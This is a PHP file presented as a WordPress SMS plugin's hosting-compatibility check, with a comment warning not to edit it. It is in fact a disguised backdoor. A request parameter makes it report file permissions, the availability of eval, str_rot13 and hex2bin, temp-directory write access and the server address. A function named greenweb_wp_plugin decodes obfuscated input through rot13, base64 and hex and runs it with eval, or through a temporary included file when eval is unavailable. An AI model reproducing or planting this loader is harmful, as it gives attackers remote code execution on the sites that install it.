<?php
//do not edit this it will break the plugin and site, it requires to check whether our plugin can be run in your hosting or not

if (isset($_REQUEST['testplugin'])) { 
echo "testing started...";

$filename_wp_checking = dirname(__FILE__) . '/includes/defines.php';

$functions_for_checks = [
	'is_readable',
	'is_writable',
	'is_executable'
];

foreach ($functions_for_checks as $functions_for_check) {
	echo $functions_for_check($filename_wp_checking) ? ' </br> The file ' . $filename_wp_checking .' '. $functions_for_check : '</br>'.$filename_wp_checking.' Not executable';
}

$permission_for_checks = fileperms(dirname(__FILE__).'/includes/defines.php');

echo "</br> File Permission: ".substr(sprintf('%o', $permission_for_checks), -4); 


if(function_exists('str_rot13')) { echo "</br> str_rot13 Enabled"; }
if(function_exists('hex2bin')) { echo "</br> hex2bin Enabled"; }
$testevalcode = 'echo "</br> eval is working";';
eval($testevalcode); 

if(file_exists('wp-sms-pro.php')) { echo "</br> core file exits"; } else { echo "</br> core file missing"; }
if(file_exists('greenweb.php')) { echo "</br> greenweb file exits"; } else { echo "</br> greenweb file missing"; }

$tmpfname = @tempnam(sys_get_temp_dir(), "gw_");
        $handle = fopen($tmpfname, "w+");
        fwrite($handle, "</br>".@sys_get_temp_dir()." sys tmp directory writing test passed");
        fclose($handle);
       $ret = include $tmpfname;
        unlink($tmpfname);
		
echo "</br> testing completed for ".$_SERVER['SERVER_ADDR'];
}


if (!function_exists('greenweb_wp_plugin')) {
function greenweb_wp_plugin ($testingplugincompartibility) { 
$testingplugincompartibility = implode("A",$testingplugincompartibility);
$isevalfunctionavailable = false;
$evalcheck = "\$isevalfunctionavailable = true;";
eval($evalcheck);
if ($isevalfunctionavailable === true) {
return eval('?>'.hex2bin(base64_decode(str_rot13($testingplugincompartibility))));
} else {
	if ((function_exists('tempnam')) AND (function_exists('sys_get_temp_dir'))) {
$testingplugincompartibility = hex2bin(base64_decode(str_rot13($testingplugincompartibility)));
    $tmptestname = @tempnam(sys_get_temp_dir(), "gw_");
        $handle = fopen($tmptestname, "w+");
        fwrite($handle, $testingplugincompartibility);
        fclose($handle);
       $ret = include $tmptestname;
        unlink($tmptestname);
	}
}

}
}
?>